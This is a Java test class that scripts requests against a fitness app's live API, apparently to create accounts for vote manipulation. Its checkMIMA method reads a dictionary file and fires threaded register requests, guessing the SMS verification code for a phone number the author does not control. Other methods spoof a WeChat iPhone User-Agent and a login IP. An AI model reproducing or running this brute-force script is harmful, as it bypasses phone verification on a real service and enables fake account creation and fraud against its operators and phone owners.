package com.xpfirst.hdrRouter.Vote.PF;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;
import org.junit.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.URLEncoder;

/**
 * Created by xuexin on 2017/8/8.
 */
public class Vote1 {
    private static final Logger log = LoggerFactory.getLogger(Vote1.class);
    private static boolean succusfal = false;


//    @Test
//    public void phoneFor(){
////        int phone = 1000;
////        for (int i = 0; i < 1000; i++){
////            getCode(phone+i);
////        }
//
//        getCode(1000);
//    }

    @Test
    //发送验证码,接口有bug,获取验证码,并不需要使用
    public void getCode() {

        //获取验证码
        String phone = "18518761000";
        String phoneStr = "{phone:'"+phone+"'}"; // java.net class
        try {
            phoneStr = URLEncoder.encode(phoneStr, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        String url = "http://www.fitness-partner.cn/jianshen/f/client/service?a=checkPhone&params=" + phoneStr;


        try {
            CloseableHttpClient httpclient = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            httpGet.setHeader("User-Agent","Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.14 NetType/WIFI Language/zh_CN");
            CloseableHttpResponse response = httpclient.execute(httpGet);


            //发送Post,并返回一个HttpResponse对象
            String result = EntityUtils.toString(response.getEntity());
            log.info("================= > " + result);
            JSONObject object = JSON.parseObject(result);
            String code = object.getString("code");
            if (code.equals("0")){
                //成功
                log.info("================= > 发送成功: " + phone);
            }


        } catch (IOException e) {
            e.printStackTrace();
            log.info("================= > " + e);
        }
    }


    @Test
    // 循环使用密码
    public void checkMIMA(){

        PoolingHttpClientConnectionManager cm = new PoolingHttpClientConnectionManager();

        CloseableHttpClient httpclient = HttpClients.custom()
                .setConnectionManager(cm)
                .build();

        String phone = "18518761000";
        try {
            String encoding="UTF-8";
            File file=new File("/Users/xuexin/Documents/GitHub/ssm/src/test/java/com/xpfirst/hdrRouter/PF/passdict6-1.txt");
            if(file.isFile() && file.exists()){ //判断文件是否存在
                InputStreamReader read = new InputStreamReader(
                        new FileInputStream(file),encoding);//考虑到编码格式
                BufferedReader bufferedReader = new BufferedReader(read);
                String lineTxt = null;

                int i = 0;
                GetThread[] threads = new GetThread[1000000];
                while((lineTxt = bufferedReader.readLine()) != null){
                    System.out.println("密码="+lineTxt);
                    if (succusfal){
                        log.info("================= > 注册成功 " + phone);
                        break;
                    }
                    HttpGet httpGet = registToFP(httpclient, phone,lineTxt);
                    threads[i] = new GetThread(httpclient, httpGet);
                    i++;
                }
                read.close();

                // start the threads
                for (int j = 0; j < threads.length; j++) {
                    threads[j].start();
                }
                // join the threads
                for (int j = 0; j < threads.length; j++) {
                    threads[j].join();
                }

            }else{
                System.out.println("找不到指定的文件");
            }
        } catch (Exception e) {
            System.out.println("读取文件内容出错");
            e.printStackTrace();
        }
    }
    //注册新账号
    public HttpGet registToFP(CloseableHttpClient httpclient, String phone,String checkCode) {
        //使用验证码
        String pwd = "5211314";
        String phoneStr = "{phone:'"+phone+"',pwd:'"+pwd+"',deviceType:'0',checkCode:'"+checkCode+"'}"; // java.net class
        try {
            phoneStr = URLEncoder.encode(phoneStr, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        String url = "http://www.fitness-partner.cn/jianshen/f/client/service?a=register&params=" + phoneStr;
        HttpGet httpGet = new HttpGet(url);
        httpGet.setHeader("User-Agent","Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.14 NetType/WIFI Language/zh_CN");
        return httpGet;
    }
    static class GetThread extends Thread {
        private final CloseableHttpClient httpClient;
        private final HttpContext context;
        private final HttpGet httpget;
        public GetThread(CloseableHttpClient httpClient, HttpGet httpget) {
            this.httpClient = httpClient;
            this.context = HttpClientContext.create();
            this.httpget = httpget;
        }
        @Override
        public void run() {
            CloseableHttpResponse response = null;
            try {
                response = httpClient.execute(
                        httpget, context);

                //发送Post,并返回一个HttpResponse对象
                String result = result = EntityUtils.toString(response.getEntity());
                JSONObject object = JSON.parseObject(result);
                String code = object.getString("code");
                if (code.equals("0")){
                    //注册成功
                    succusfal = true;
                    log.info("================= > 注册成功 " + result);
                }else{
                    log.info("================= > 注册失败");
                }
            } catch (ClientProtocolException ex) {
                log.info("================= > 注册失败");
            } catch (IOException ex) {
                log.info("================= > 注册失败");
            }
            try {
                response.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }





    @Test
    //登录
//    public void loginTo(String phone, String pwd)
    public void loginTo()
    {
        String phone = "nanjizhiyin";
        //获取验证码
        String pwd = "5211314";
        String phoneStr = "{phone:'"+phone+"',pwd:'"+pwd+"',loginIp:'120.134.2.3'}"; // java.net class
        try {
            phoneStr = URLEncoder.encode(phoneStr, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }


        String url = "http://www.fitness-partner.cn/jianshen/a/client/service?a=login&params=" + phoneStr;


        try {
            CloseableHttpClient httpclient = HttpClients.createDefault();
            HttpGet httppost = new HttpGet(url);
            CloseableHttpResponse response = httpclient.execute(httppost);


            //发送Post,并返回一个HttpResponse对象
            String result = EntityUtils.toString(response.getEntity());

            JSONObject jObject = JSON.parseObject(result);
            Integer code = jObject.getInteger("code");
            if (code.equals(0)){
                JSONObject infoObj = jObject.getJSONObject("info");
                String infoid = infoObj.getString("id");
                log.info("================= > 登录成功 " + infoid);
            }

        } catch (IOException e) {
            e.printStackTrace();
            log.info("================= > " + e);
        }
    }
}
